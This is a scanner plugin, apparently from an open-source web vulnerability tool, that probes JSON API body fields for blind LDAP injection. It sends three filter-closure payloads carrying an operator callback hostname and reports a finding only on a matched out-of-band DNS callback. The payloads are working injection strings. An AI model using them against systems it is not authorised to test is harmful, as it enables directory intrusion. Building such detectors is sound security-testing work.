/* ---
id: ldap-injection-oob-json-body
name: LDAP Injection via JSON Body Field (blind OOB)
description: Detects blind LDAP injection when a JSON API body field is spliced into a directory filter, sending filter-closure payloads that carry the operator hostname and confirming only on a matched out-of-band callback.
author: GASH contributors
severity: high
tags: [ldap, injection, blind, oob, json, api]
safe: false
deep: false
active: true
requires_auth: false
max_requests: 40
phase: probe
order: 66
oob: required
api_version: "1.0"
tests: tests/fixtures/ldap-injection-oob-json-body/
--- */
// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (C) 2026 Xmar1881 / GASH contributors
// Module: github.com/Xmar1881/Gash
//
// File: plugins/ldap/ldap-injection-oob-json-body.js
// What: Tier 2 blind LDAP-injection plugin for JSON request bodies.
// Why: The differential JSON plugin only proves the class when the backend
//   answers the two branches differently; a hardened directory that returns the
//   same "invalid credentials" page for both stays invisible. A filter that
//   closes the query and asks the directory to resolve the operator hostname
//   leaves exactly one observable, the callback, and that needs a JSON object
//   rebuilt around a discovered field, which Tier 1 cannot express.

function run(probe, ctx) {
  const points = ctx.injectionPoints();
  const jsonContentType = "application/json";
  const maxSends = 40;
  const sent = [];

  // Filter closures that terminate the injected expression and make the
  // directory resolve the operator hostname. No attribute is read back.
  const builders = [
    function (o) { return "*)(cn=*))(|(cn=" + o.domain + ""; },
    function (o) { return "*)(uid=*))(|(uid=" + o.domain + ""; },
    function (o) { return "*))(|(objectClass=*)(cn=" + o.domain + ""; },
  ];

  for (const point of points) {
    if (sent.length >= maxSends) {
      break;
    }
    if (String(point.paramLocation || "").toLowerCase() !== "body") {
      continue;
    }
    if (!point.paramName) {
      continue;
    }
    const name = point.paramName;
    for (let i = 0; i < builders.length; i++) {
      if (sent.length >= maxSends) {
        break;
      }
      const oob = host.oob.generate("dns");
      if (!oob) {
        // No self-hosted server: honest skip, never a fabricated callback.
        return [];
      }
      const payload = builders[i](oob);
      probe.send({
        url: point.url,
        method: point.method,
        paramName: "",
        paramLocation: "body",
        value: '{"' + name + '":"' + payload + '"}',
        headers: { "Content-Type": jsonContentType },
      });
      sent.push({ corr: oob.correlationId, ns: oob.namespace, point: point });
    }
  }
  if (sent.length === 0) {
    return [];
  }

  const ids = [];
  for (let i = 0; i < sent.length; i++) {
    ids.push(sent[i].corr);
  }
  const ev = host.oracles.oobAny(ids, sent[0].ns);
  if (!ev || ev.correlationId === undefined) {
    return [];
  }
  for (let i = 0; i < sent.length; i++) {
    if (sent[i].corr === String(ev.correlationId)) {
      return [host.candidate(sent[i].point, "oob", ev)];
    }
  }
  return [];
}
